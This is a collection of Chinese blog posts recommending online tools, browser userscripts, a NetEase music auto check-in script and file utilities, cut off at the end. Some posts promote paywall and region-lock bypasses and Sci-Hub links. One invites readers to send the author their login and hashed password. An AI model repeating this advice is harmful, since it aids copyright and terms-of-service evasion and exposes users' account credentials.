    <content type="text"><![CDATA[苏生不惑第150 篇原创文章，将本公众号设为星标，第一时间看最新文章。 在线办公神器之前写过2篇，这是第3篇。 那些你可能用得上的在线办公神器 那些你可能用得上的在线办公神器（二） PPT模板一个有情怀的免费PPT模板下载网站 http://www.ypppt.com/类似的还有 http://www.1ppt.com/ ， https://templates.office.com/，http://www.hippter.com/ ，http://www.officeplus.cn/Template/Home.shtml ，另外推荐一个PPT模板抓取工具（公众号内回复 PPT 获取） ，下载的模板在当前盘的newnew目录。 在做PPT的时候，我们经常需要将数据可视化，推荐一个灵感网站网易数读http://data.163.com/special/datablog，这里的一些数据可以给你个参考，比如高考结束了要报考，可以看看理科热门专业历年排名。 中文写作校对一个非常实用的中文写作校对工具秘塔写作猫，可帮你校对字词错误、标点错误、语序错误、语法问题，并给出修改建议，支持全文分析和智能排版 https://xiezuocat.com/ 流程图在线制作流程图工具 https://www.liuchengtu.com/lct/ 类似的还有 https://excalidraw.com/ ，draw.io ，https://code2flow.com，https://gitmind.cn/ 简历制作关于简历之前介绍过 那些你可能用得上的简历写作工具 用 Markdown 来写简历和 PPT ，推荐一个专门写简历的网站简历本https://www.jianliben.com/ 类似的还有橙子简历 https://wonderfulcv.com/ ，https://resume.mdnice.com/ ，https://resumd.t9t.io/ 论文下载国内最知名的就是知网了 https://www.cnki.net/ ，如果想下载pdf版的学位论文，先将网页改成英文版或繁体版再下载。 类似的还有知识搜索 https://www.cn-ki.net/ ，超星 https://www.chaoxing.com/ ，https://sci-hub.shop/， https://sci-hub.ren/ 二维码制作除了常用的草料二维码 https://cli.im/ ，推荐一个前端实现的生成艺术二维码 http://qrbtf.com/ 如何导出你的微信语音 这篇文章生成的二维码效果：类似的还有模板码 https://www.mobanma.com/ ，二维码梦工厂http://qrdream.com/ 在线软件一个常用软件在线平台https://uzer.me/ ，可以直接在线使用Word、PPT、PS、AI、CAD、Matlab、Visio等软件，不用在自己电脑安装这些软件就可以在线使用 ，实现移动办公、协同办公。比如打开一个PDF文件。 调查问卷如果想做市场调研，满意度调查，投票评选，报名登记等推荐问卷网 https://www.wenjuan.com/ 类似的还有腾讯问卷 https://wj.qq.com/ ，金数据 https://jinshuju.net/ ，问卷星https://www.wjx.cn/ h5制作 不编程也能完成H5移动页面制作 https://www.baomitu.com/ 类似的还有创客贴 https://www.chuangkit.com ，百度h5 https://h5.bce.baidu.com/ 搜索引擎快照比如知乎文章被删了可以去看搜索引擎的快照，推荐网页快照网 https://2tool.top/输入链接查看快照，如果想备份文章或者网页看之前的文章再谈备份网页和公众号文章 翻译推荐之前文章那些好用的翻译工具 介绍过的翻译神器https://www.deepl.com/zh/translator ， 通过训练人工智能来理解和翻译文本，翻译出的内容读起来自然通顺，准确细致，有接近真人语义的流畅品质，还可以直接翻译Word和PowerPoint文档 。 去除视频背景在线一键去除视频文件的背景，和超好用的抠图神器remove.bg是同一家https://www.unscreen.com/ logo 设计人工智能为您在线设计LOGO https://www.logosc.cn/,不过下载logo需要付费，教你个免费的技巧，找到&lt;svg 开头的代码。 复制到 https://www.bejson.com/ui/svg_editor/ 右侧即可显示图片。截图效果。 如果想生成pornhub风格的logo可以使用 https://www.logoly.pro/#/ ，https://lab.bangbang93.com/porn-hub ，这个之前介绍过那些好玩的生成器网站 相关的有百度纪念日logo https://logo.baidu.com ，SVG转换 https://svgtopng.com/zh/ ，https://convertio.co/zh/svg-jpg/ 万能命令如名字一样功能也万能的网站 https://wanneng.run/cn/在任何网页的网址前面加上 wn.run/ 即可展示用于该网页的在线工具，比如 https://wanneng.run/https:/bilibili.com 后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实用油猴脚本推荐，让你的谷歌浏览器更强大]]></title>
    <url>%2F2020%2F07%2F06%2F%E5%AE%9E%E7%94%A8%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%E6%8E%A8%E8%8D%90%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9B%B4%E5%BC%BA%E5%A4%A7%2F</url>
    <content type="text"><![CDATA[苏生不惑第149 篇原创文章，将本公众号设为星标，第一时间看最新文章。 油猴是一款免费的浏览器扩展和流行的用户脚本管理器，可以运行在谷歌，edge，360等浏览器上，功能非常强大，关于油猴脚本之前写过了： 2020 最全百度网盘搜索，找电影资源不再愁 如何找回bilibili(b站)收藏夹里失效的视频？ 如何更优雅地看电影/刷剧 Chrome 浏览器扩展神器油猴 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 2020 年 3 月最新加速下载百度网盘文件方法 这里再整理分享下实用的油猴脚本。 安装及使用油猴油猴Chrome扩展地址https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN ，如果上不了谷歌参考之前文章 上不了谷歌如何安装 Chrome 扩展？ 或者公众号后台回复 油猴 手动安装，这款扩展有900万+用户安装过，值得信赖。 扩展安装好了打开 https://greasyfork.org/zh-CN 选择对应的脚本安装即可。 安装好的脚本在管理面板可以看到。 如果想导出备份你安装过的脚本，可以使用导出功能生成一个压缩文件 ，里面都是js源码，重装电脑或换了电脑后可将备份的压缩文件再导入进去，这样就不用一个个再安装了。 网盘助手这个脚本主要功能有获取百度网盘、腾讯微云、蓝奏云、天翼云盘的提取码 ，百度网盘生成并展示下载链接，百度网盘分享时自定义提取码，解除一分钟观看限制，脚本地址https://greasyfork.org/zh-CN/scripts/378301，如果想自动识别并标记百度云、蓝奏云、腾讯微云和天翼云盘的链接状态推荐 https://greasyfork.org/zh-CN/scripts/394216 他人分享的文件即使你不知道提取码也可以通过这个脚本来提取，它会自动帮你填写提取码，当然这个不是百分之百能提取成功。 配合idm来加速下载百度网盘文件，具体使用看之前文章2020 年 3 月最新加速下载百度网盘文件方法 如果提示403错误，修改应用ID，目前还能用。 看VIP视频有些影视剧需要VIP观看的，没有会员怎么办？安装这个油猴脚本https://greasyfork.org/zh-CN/scripts/370634 ，播放页面左侧有个VIP按钮。 点击后会跳转到新的播放页面，如果有卡顿切换线路。 视频网站去Logo播放界面有视频网站的logo，如果你截图或者录屏比较介意这个，那推荐这个油猴脚本https://greasyfork.org/zh-CN/scripts/391168 安装脚本前：安装脚本后： 如果不想安装油猴脚本直接在控制台执行也是可以的。12345setInterval(function ()&#123; document.querySelectorAll(".iqp-logo-top").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//爱奇艺 document.querySelectorAll(".txp_waterMark_pic").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//腾讯 document.querySelectorAll(".logo-new").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//优酷&#125;, 100); 网页限制解除有些网站禁止了复制和右键功能，可以使用这个脚本来解决 https://greasyfork.org/zh-CN/scripts/41075 解除B站区域限制;b站有些剧限制了港澳台才能播放，如果你想突破b站的版权限制，推荐这个脚本 https://greasyfork.org/zh-CN/scripts/25718 ，它通过替换获取视频地址接口的方式, 实现解除B站区域限制; 只对HTML5播放器生效。 另外推荐一个b站增强脚本 https://greasyfork.org/zh-CN/scripts/373563-bilibili-evolved ，主要功能有：下载视频, 音乐, 封面, 弹幕 / 简化直播间, 评论区, 首页 / 自定义顶栏, 删除广告, 夜间模式 / 触屏设备支持，非常强大，详情见之前文章如何更优雅地使用 bilibili(b站) 知乎网页助手如果玩知乎推荐这个脚本 https://greasyfork.org/zh-CN/scripts/384172 ，主要功能介绍：1、知乎站外链接直接跳转至目标网址；2、自动展开问题全部信息，同时展示所有回答；3、去除知乎网页中的广告；4、知乎网页中短视频下载；5、解除知乎复制限制-划词复制（鼠标左键划词自动添加到剪切板）；6、去除烦人的登录提示；7、自动高清图片显示 豆瓣资源下载大师 找豆瓣资源推荐脚本 https://greasyfork.org/zh-CN/scripts/329484 【装这一个脚本就够了！可能是你遇到的最好的豆瓣增强脚本】聚合数百家资源网站，通过右侧边栏1秒告诉你哪些网站能下载豆瓣页面上的电影|电视剧|纪录片|综艺|动画|音乐|图书等。 比如打开豆瓣读书，右侧可以看到提供的很多网站资源。 微博药方新浪微博根据关键词、作者、话题、来源等过滤微博 ，脚本地址 https://greasyfork.org/zh-CN/scripts/3249-yet-another-weibo-filter 百度网盘搜索聚合 在百度云盘页面中新增百度网盘资源_搜索引擎 https://greasyfork.org/zh-CN/scripts/375337 ，打开百度网盘主页 https://pan.baidu.com/disk/home ，下拉框列出了几十个网盘搜索网站，直接搜索关键词跳到对应的网站。 找回失效的b站视频修复哔哩哔哩(www.bilibili.com) 失效的收藏（可查看av号、简介、标题、封面），脚本地址 https://greasyfork.org/zh-CN/scripts/383143 收藏夹失效的视频显示出封面和标题，还能直接复制av号和简介。 不在收藏夹里的b站视频替换网站的av号即可 https://www.biliplus.com/video/av21105994/ 百度搜索去广告快速去除百度结果页的顽固广告和右边栏，适当放大了界面，采用居中布局，美化了字体等样式，页面显示更加美观，支持随时开启/关闭黑色主题 ，脚本地址 https://greasyfork.org/zh-CN/scripts/406336 搜索再也没有垃圾广告了，不过我还是推荐你使用谷歌搜索。 查看文章目录这个脚本会在页面右侧展示一个浮动的文章大纲目录，方便你快速了解作者想说的内容，脚本地址 https://greasyfork.org/zh-CN/scripts/406337-toc-bar ，支持简书，知乎，公众号，GitHub等网站。 比如我之前那篇文章 那些你可能不知道的网络冷知识奇技淫巧 显示当前网站可用脚本找脚本麻烦？安装这个脚本 https://greasyfork.org/zh-CN/scripts/24508-userscript-show-site-all-userjs ，直接推荐显示当前网站可以安装的脚本，可以直接安装。 如果还没找到你想要的脚本，可用自己写个脚本，比如我之前写的 一个骚操作，公众号粉丝破10万！ 后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网易云音乐账号等级快速升级：每天自动打卡听歌300首]]></title>
    <url>%2F2020%2F07%2F06%2F%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E8%B4%A6%E5%8F%B7%E7%AD%89%E7%BA%A7%E5%BF%AB%E9%80%9F%E5%8D%87%E7%BA%A7%EF%BC%9A%E6%AF%8F%E5%A4%A9%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1%E5%90%AC%E6%AD%8C300%E9%A6%96%2F</url>
    <content type="text"><![CDATA[苏生不惑第148 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于网易云音乐之前写过： 那些你可能不知道的网易云音乐奇技淫巧 不想下载那么多音乐软件？全网音乐在线听和下载 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 今天分享的是每天自动在网易云音乐刷完300首歌，让你的账号快速升级（等级数据每天下午2点更新），关于等级特权 这里有介绍 https://music.163.com/#/level/details ，最高级lv10有100G音乐云盘免费容量。 一个账号平均耗时为1分钟左右，放在服务器上运行即可，不需要人工干预，每天自动听歌做任务，然后向你的微信发送任务通知，支持无服务器的云函数部署。 使用方式分为手动执行Python脚本，腾讯云云函数自动执行和在线打卡。 手动执行Python脚本先从 https://github.com/ZainCheung/netease-cloud 下载代码到本地。 修改配置文件init.config，把自己的网易云音乐账号（邮箱或者手机号）和 md5 加密（用类似http://www.md5.cz/ 这样的网站加密下就好）后的密码填好。123account = 188xxxxxxpassword = ed1481xxxxpeopleSwitch = false//如果需要测试多个账号改为true，并修改配置文件account.json 打开网易云音乐主页，看到目前累计累积听歌20首。 然后直接执行脚本123456789101112131415λ python main.py配置文件读取完毕api测试正常账号: 188xxxxx 开始执行2020.07.01-19:53:14 登陆成功2020.07.01-19:53:18 签到成功2020.07.01-19:53:23 获取用户详情成功2020.07.01-19:53:33 &#123;"code":200,"count":310&#125;2020.07.01-19:53:33 用户:我们都爱听老歌 第1次打卡成功,即将休眠30秒2020.07.01-19:54:22 &#123;"code":200,"count":310&#125;2020.07.01-19:54:22 用户:我们都爱听老歌 第2次打卡成功,即将休眠30秒2020.07.01-19:55:15 &#123;"code":200,"count":310&#125;2020.07.01-19:55:15 用户:我们都爱听老歌 第3次打卡成功,即将休眠30秒2020.07.01-19:55:46 用户:我们都爱听老歌 Server酱推送成功2020.07.01-19:55:46 用户:我们都爱听老歌 今日任务已完成 可以看到累积听歌320首了。如果你想通知微信，需要设置Server酱的key http://sc.ftqq.com/，它可以直接将消息发到你关注的公众号。测试发条消息。修改配置文件init.config的 sckey，再次执行脚本微信收到通知。 如果你本地没有安装 Python，而且每次执行很麻烦，可以使用腾讯云的云函数每天帮你自动执行脚本，这样你就不会忘了。 腾讯云云函数什么是云函数？就是可以让你没有服务器、本地电脑不用下载Python也可以运行脚本。 先用微信登陆腾讯云，然后打开 https://console.cloud.tencent.com/scf/list-create?rid=1&amp;ns=default 新建一个函数，名字随意起，运行环境选择Python3.6，运行方式为空白函数。 进入下一步，描述随意写，执行方法为index.main，提交方法为本地上传文件夹。将刚才下载的代码文件夹上传上去，点开高级设置，内存64MB，超时时间900. 修改配置文件init.config，跟上面一样的填写账号和密码。 注意api需要改下，因为作者的api地址用的人很多，会提示403错误，可以自己免费在 https://glitch.com/ 建一个。 首先fork 这个仓库代码 https://github.com/ZainCheung/netease-cloud-api，之后用 GitHub登录后导入你的项目，再修改项目名，我的是 http://sushengbuhuo.glitch.me ，将这个地址填写到配置文件init.config的api里。 修改配置文件后保存，测试，可以看到运行结果日志。 可以看到现在累积听歌620首了。 同时收到微信通知。 接着在触发管理里设置定时任务，每天早上8点20（也就是我每天发公众号文章的时间）执行脚本，这样就可以每天自动打卡升级了，而这一切都是免费的。 如果你不想折腾，也想快速升级你的网易账号，把登录账号和md5加密后的密码（我是不知道你原密码的）发给我，我配置在腾讯云云函数里，每天早上8点20听300首歌给你的账号打卡升级。 其实它的实现原理就是模拟登陆网易云音乐网页版听歌打卡，就是执行https://github.com/ZainCheung/netease-cloud-api 里 index.php的代码1234567891011$api= new API();$api-&gt;follow();//test();if($_REQUEST["do"]=="login")&#123;echo $api-&gt;login($_REQUEST["uin"],$_REQUEST["pwd"]);&#125;elseif($_REQUEST["do"]=="email")&#123;echo $api-&gt;loginByEmail($_REQUEST["uin"],$_REQUEST["pwd"]);&#125;elseif($_REQUEST["do"]=="sign")&#123;echo $api-&gt;sign();&#125;elseif($_REQUEST["do"]=="daka")&#123;echo $api-&gt;daka_new();&#125;elseif($_REQUEST["do"]=="check")&#123;echo $api-&gt;follow();&#125;elseif($_REQUEST["do"]=="detail")&#123;echo $api-&gt;detail($_REQUEST["uid"]);&#125;else&#123;echo $api-&gt;index();&#125; 在线打卡如果你觉得下载代码，还要登录腾讯云建云函数还是麻烦，那直接用搭建好的在线打卡服务（公众号后台回复 音乐 获取网址）。 输入网易云音乐账号和密码，点击打卡，成功听歌310首。 ps：今天有小伙伴加我（公众号后台回复 微信 加我），还是关于去除优酷/爱奇艺和腾讯视频上的logo，我之前有写过文章如何更优雅地看电影/刷剧，不过安装油猴脚本什么的还是麻烦。 你可以直接打开控制台输入代码运行即可。12345setInterval(function ()&#123; document.querySelectorAll(".iqp-logo-top").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//爱奇艺 document.querySelectorAll(".txp_waterMark_pic").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//腾讯 document.querySelectorAll(".logo-new").forEach(function(item,index,arr)&#123;item.style.display='none';&#125;);//优酷&#125;, 100); 右上角的爱奇艺logo不见了。 | 公众号后台回复关键词 | 用途 || — | — || 微信 | 获取你的微信好友头像拼图及查看微信撤回消息 || b站 | 获取下载b站视频工具及找回被删b站视频方法 || 视频 | 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 || 百度网盘 | 获取加速下载网盘文件方法及查找电影电视剧网站 || 朋友圈 | 获取发空白朋友圈方法 || 微博 | 获取备份微博工具及分析微博账号数据 || 音乐 | 获取下载音乐工具及在线听歌网站 || 油猴 | 获取油猴脚本 ||谷歌|获取安装Chrome扩展方法| 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再谈备份网页和公众号文章]]></title>
    <url>%2F2020%2F07%2F06%2F%E5%86%8D%E8%B0%88%E5%A4%87%E4%BB%BD%E7%BD%91%E9%A1%B5%E5%92%8C%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%2F</url>
    <content type="text"><![CDATA[苏生不惑第147 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于备份网页之前写过了如何备份可能被删的公众号文章和网页，这里再细说下。 不知道为什么现在公众号文章底部我的印象笔记去掉了。现在只能手动给公众号我的印象笔记发文章链接来保存了。 为了防止文章被删后看不了，我又整理了几个实用的备份方案。 SingleFile这是个Chrome扩展https://chrome.google.com/extensions/detail/mpiodijhokgodhhofbcjdecpffjipkle ，关于如何安装Chrome扩展参考之前文章上不了谷歌如何安装 Chrome 扩展？ ,它可以将一个完整的页面保存到单个 HTML 文件中。 以这篇文章如何导出你的微信语音 为例,直接右键使用SingleFile保存。然后生成一个 1.2MB的html单文件，外部 css 、js 、image 会转为 base64 （根据需要）嵌入到 html 中，方便保存。用浏览器打开这个文件，图片和样式都还在。如果用Ctrl+s直接保存网页，图片都丢失了。 另外还有Chrome扩展SingleFileZ https://chrome.google.com/webstore/detail/singlefilez/offkdfbbigofcgdokjemgjpdockaafjg ，它是SingleFile的增强版，虽然生成的是单个 html，但实际是个 zip 文件，推荐使用二管家来管理Chrome扩展，可以方便的看扩展更新通知并记录扩展历史，自动开启/关闭拓展 https://ainoob.com/zh/project/nooboss GitHub使用 Github Action 来备份豆瓣日记， 微博文章， 公众号文章， 知乎专栏等。 使用起来很简单，在 https://archives.duty-machine.now.sh/ 直接提交文章链接 https://mp.weixin.qq.com/s/4qN1rjaGWaap91Ootgp-MQ一会就生成一个备份后的链接 https://github.com/duty-machine/duty-machine/issues/358它直接将公众号文章原文抓取过来了。 当然这个仓库是公用的，有很多别人备份的文章，你可以自己建个仓库专门存储备份文章，新建一个action即可。123456789101112on: issues: types: [opened]jobs: build: runs-on: ubuntu-latest steps: - uses: duty-machine/duty-machine-action@master env: TOKEN: $&#123;&#123; github.token &#125;&#125; REPOSITORY: $&#123;&#123; github.repository &#125;&#125; 我想备份的文章都通过GitHub保存起来。 如果想备份的文章被删了，只能尝试用搜索引擎快照找下。 谷歌/百度快照比如知乎文章被删了。输入文章链接，进入网页快照 可以看到这篇文章被删前5月23号的快照，然后使用上面的SingleFile保存全文到本地。 想看其他搜索引擎的快照可以看看网页快照网 https://2tool.top/输入链接查看。 如果想备份除了公众号，知乎的任意网页推荐互联网档案馆 archive。 互联网档案馆关于这个档案馆 https://archive.org/web，之前写过文章[跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌](https://mp.weixin.qq.com/s/LKDGKWi62J5Zyzh3rB-IiQ)，我还保存过一篇文章 ，生成了个永久链接 https://web.archive.org/web/20191027081838/https://mp.weixin.qq.com/s/Xz1m-mqtCcBF_4hmGCpkUQ ，现在还能打开。 不过这个网站在墙外，怎么上去这里就不说了。 为了方便使用archive，可以安装Chrome扩展Archiveror https://chrome.google.com/webstore/detail/archiveror/cpjdnekhgjdecpmjglkcegchhiijadpb也可以直接右键选择 archive.is， archive.org， perma.cc。 之后跳转 https://web.archive.org/save/https://mp.weixin.qq.com/s/Nu8x-dA2IRXtOcjVJuenKA 生成一个永久链接 https://web.archive.org/web/20200630144008/https://mp.weixin.qq.com/s/Nu8x-dA2IRXtOcjVJuenKA 现在公众号文章末尾增加了点赞功能，来帮忙点个赞支持下我继续更新文章吧，感谢。 后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（三）]]></title>
    <url>%2F2020%2F07%2F06%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第146篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣的网站 ，那些有趣的网站（二），这是第3篇，其他有意思的网站在文章开头的专辑里。 烂片排行榜华语影坛历史上的第一个“烂片排行榜” https://datamuse.guokr.com/wmu可以搜索明星拍过的烂片 明星缩写查询经常在微博看到各种拼音缩写，不知道为什么现在的网络变成这样，来这里查下明星的缩写，还有明星八卦什么的 http://www.iseecs.com/ 比如xz 可能代表 肖战 邢舟 徐峥 弦子 馨子 向佐 贤真 这个有点类似之前介绍的 能不能好好说话 https://lab.magiconch.com/nbnhhsh/ 简悦在线版关于简悦在之前文章介绍过，如果你不想安装Chrome扩展，可以直接使用网站https://simp.red/直接把链接放在URL参数https://simp.red/trans?url=https://www.bilibili.com/read/cv6533660 ，它将 标题 描述 正文 提取出来重新进行排版，更适合长时间阅读的一种功能，间接去除了广告和方便直接复制文字。嫌麻烦可以添加为书签 javascript:(function(){window.open(&#39;https://simp.red/trans?url=&#39;+decodeURIComponent(document.location.href))})(); ，详情见 https://www.notion.so/c8386288be1642c6bee7a29cb46fb7a8 在线 WindowsxpWindowsxp系统尽管已经被win7和win10替代了，但应该是很多人的回忆，还可以玩玩扫雷游戏什么的 https://geekprank.com/经典的win7更新 https://geekprank.com/win7-update/ 人工智能诗歌写作支持创作绝句，藏头诗，词等 http://jiuge.thunlp.org/，用苏生不惑生成的结果：吾道本无事，于今我亦稀，未能逃世俗，何必解人归如果想查相似词使用 https://tool.mingdawoo.com/lang/nearby_word 泥石流海报用来生成二维码分享图 https://graph.readhub.cn/之前文章如何导出你的微信语音 生成效果 在线学方言支持粤语，客家话，上海话，四川话等方言 http://www.fyan8.com/可以跟着mp3来学。 微信拍一拍文案生成器大家应该都玩过拍一拍了，来试试这个生成器 http://chuangzaoshi.com/plp/ 网页录音 通过网页录音，自动提取 PPT 文案分句，然后按句子录音，自动重放对比。 这里以周杰伦《晴天》歌词为例写入个 txt 文件，每行一句，然后点右边的打开就可以录音了。录音完后点打包会把录音下载为一个 zip 文件，并生成一个音频对应的描述文件 https://recpage.applinzi.com/ 装b生成器各种好玩的生成器 https://cc.bjadjty.com/ http://g.g.adccd.com/ http://zb.yuanrenbang.com/ 回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何导出你的微信语音]]></title>
    <url>%2F2020%2F06%2F24%2F%E5%A6%82%E4%BD%95%E5%AF%BC%E5%87%BA%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%E8%AF%AD%E9%9F%B3%2F</url>
    <content type="text"><![CDATA[苏生不惑第145 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过以下文章，有兴趣可以点击查看： 那些你可能不知道的微信奇技淫巧 那些你可能不知道的网络冷知识奇技淫巧 一个骚操作，公众号粉丝破10万！ 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 想看的公众号文章被删了怎么办？ 如何备份可能被删的公众号文章和网页 一键生成你的微信好友拼图 微信撤回的消息也能看到？！ c 盘空间又满了？微信清理神器帮你释放空间 先说明下，生成你所有微信好友的头像拼图，前提是你的微信能扫码登录网页版微信 https://wx.qq.com，现在很多人的微信登录不了，就没法用了，还好我的微信还能登。 还有现在微信pc端升级到2.9.5.35，需要重新替换dll文件才能看到撤回的微信消息。 最近微信新版上线了拍一拍功能，很多人玩得不亦乐乎，这张图传播甚广。于是微信拍一拍生成器也来了。http://chuangzaoshi.com/plp/ 今天分享的是如何导出你的微信语音（也支持QQ），当然前提是你的微信语音没有被清理失效了，下面说下具体操作流程，很简单，测试导出后的mp3语音文件播放没问题。 收藏语音先在手机微信里长按要导出的语音，然后选择多选，可以选择多条语音，然后点击收藏，将刚收藏的语音转为笔记。 打开电脑端微信收藏，里面有链接，相册，笔记，文件和音乐，为了防止微信里的文件经常失效可以保存到收藏里，不过限制总容量为2g 。 ps：收藏的语音，视频还可以分享到朋友圈，笔记功能很强大。 然后选择笔记，可以看到刚收藏的语音笔记。 查找silk文件右键复制它。粘贴到微信对话框发给自己。右键选择在文件夹中显示找到刚才发的语音文件，格式为.silk 如果导出的语音很多这样有点麻烦，可以直接打开电脑端微信文件管理目录下的FileStorage\Fav\Temp 里面搜索silk可以找到所有语音文件，当然如果语音文件多会很慢，可以使用之前分享的工具wox 如何快速搜索文件和文件内容 silk转 MP3之后使用软件silk2mp3 https://kn007.net/ https://github.com/kn007/silk-v3-decoder/tree/master/windows（公众号内回复 微信 获取）将silk转换为mp3文件。选择刚才的silk文件，可以多选。 开始转换，很快转换完了，生成了对应的mp3 文件。用QQ影音播放下，没问题，搞定。如果想再把语音转文字可以使用工具转换下。 ps：如果你使用的Mac系统，可使用作者提供的命令行脚本转换 sh converter.sh input ouput mp3。 回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何快速搜索文件和文件内容]]></title>
    <url>%2F2020%2F06%2F24%2F%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[苏生不惑第144 篇原创文章，将本公众号设为星标，第一时间看最新文章。 平常搜索文件一般会直接这样搜，不过如果文件太多的话会很慢，而且没法搜索文件内容。 这里分享几个好用的文件搜索工具。 EverythingEverything是一个免费Windows桌面搜索引擎，可以在NTFS卷上快速地根据名称查找文件和目录 https://www.voidtools.com/zh-cn/ 比如搜索 WeChat 很快找到对应文件。搜索中文也一样快。 而且它还支持正则表达式搜索，按快捷键 Ctrl+R 打开 正则表达式 的开关， 打开后，在 Everything 右下角状态栏中会出现正则表达式 比如想搜索文件名为jay，后缀为3个字的文件，比如jay.jpg,jay.txt什么的，直接搜索 ^jay\..{3}$。 归海数据归海数据 = Everything + 全文搜索 + 搜索引擎技术，如同搜网页一样地智能搜硬盘文件 https://guihaidata.com/安装以后添加文件索引。这里搜索之前下载的微博数据一键备份微博并导出生成PDF，顺便用Python分析微博账号数据还可以把TXT里的文件内容搜出来。 搜索文件里有假如爱有天意 的文件 Wox用过mac的小伙伴都知道一款效率神器 Alfred，可快速启动、计算和查找文件，使用起来非常方便，Windows上也有类似的工具，比如Listary和WOX。 这里说下Wox，配合 Everything使用既美观又实用，配置相当简单，插件也很丰富 https://github.com/Wox-launcher/Wox/releases 它依赖Everything，需要先启动Everything 。按快捷键win+r 快速启动软件，默认会用命令行执行输入的字符。比如打开 cmder删除开头的&gt;搜索文件，按esc关闭软件。 火柴这是一款国产软件，快速查找文件、打开应用程序、局域网秒传文件、局域网聊天 https://www.huochaipro.com/ 闪电搜索 比Everything更好用的本地搜素软件（公众号内回复 搜索 获取），免安装直接运行。搜索也很快。 uToolsuTools是一个极简、插件化、跨平台的现代桌面软件，通过自由选配丰富的插件，打造你得心应手的工具集合 https://u.tools/ ，支持Windows和Mac系统，使用快捷键alt+space启动软件。插件里选择本地搜索。它也依赖everything。 搜索的同时还能直接预览文件。 ripgrep最后再说下我最常用的命令行（基于git bash）搜索工具rg （公众号内回复 搜索 获取）https://github.com/BurntSushi/ripgrep 先配置环境变量，搜索path ，将下载的rg执行文件路径加入到环境变量path，然后就可以在命令行搜索文件内容了。 $ rg -n 